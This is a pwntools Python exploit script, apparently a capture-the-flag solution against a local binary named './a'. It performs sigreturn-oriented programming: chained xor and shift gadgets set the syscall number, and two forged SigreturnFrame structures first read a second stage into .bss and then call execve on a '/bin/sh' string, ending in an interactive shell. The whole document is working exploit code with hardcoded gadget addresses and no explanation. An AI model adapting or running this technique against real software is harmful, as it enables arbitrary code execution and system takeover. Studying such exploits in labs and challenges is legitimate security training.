from pwn import *
context(log_level='debug',arch='amd64',os='linux',terminal=['tmux','splitw','-h'])

io=process("./a")

syscall_ret=0x40102d
str_sh=0x40200A
ret_wt=0x401014
bss_addr=0x402200
shl_rax=0x401030
xor_1=0x401034 
xor_rax=0x40103D 

gdb.attach(io)
pause()

#read
sigframe=SigreturnFrame()
sigframe.rax=constants.SYS_read
sigframe.rdi=0
sigframe.rsi=bss_addr
sigframe.rdx=0x800
sigframe.rsp=bss_addr
sigframe.rbp=bss_addr
sigframe.rip=syscall_ret

payload=p64(xor_rax)+p64(xor_1)+p64(shl_rax)+p64(xor_1)+p64(shl_rax)+p64(xor_1)+p64(shl_rax)+p64(xor_1)+p64(syscall_ret)+bytes(sigframe)
io.sendafter(b"Pwn",payload)

sleep(3)


sigframe_exe=SigreturnFrame()
sigframe_exe.rax=constants.SYS_execve
sigframe_exe.rdi=str_sh
sigframe_exe.rsp=bss_addr
sigframe_exe.rbp=bss_addr
sigframe_exe.rsi=0
sigframe_exe.rdx=0
sigframe_exe.rip=syscall_ret

payload=p64(xor_rax)+p64(xor_1)+p64(shl_rax)+p64(xor_1)+p64(shl_rax)+p64(xor_1)+p64(shl_rax)+p64(xor_1)+p64(syscall_ret)+bytes(sigframe_exe)
# payload=b"aaaaaqaaaaaaa"
io.sendline(payload)

io.interactive()